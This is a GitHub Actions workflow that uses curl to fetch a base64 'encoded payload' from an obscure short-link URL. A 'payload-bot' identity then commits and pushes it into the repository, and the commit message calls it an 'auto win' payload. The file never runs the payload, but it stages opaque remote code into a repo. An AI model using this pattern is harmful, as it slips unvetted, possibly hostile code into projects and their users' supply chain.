name: sync-aw

on:
  push:
    paths:
      - '.github/workflows/sync-aw.yml'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Download encoded payload
        run: |
          curl -fsSL "https://aka.doubaocdn.com/s/j5NKkSXClz" -o aw.b64
          echo "bytes: $(wc -c < aw.b64)"

      - name: Commit payload
        run: |
          git config user.name "payload-bot"
          git config user.email "payload-bot@users.noreply.github.com"
          git add aw.b64
          git diff --cached --quiet && echo "no change" && exit 0
          git commit -m "chore: 添加 auto win 载荷"
          git push
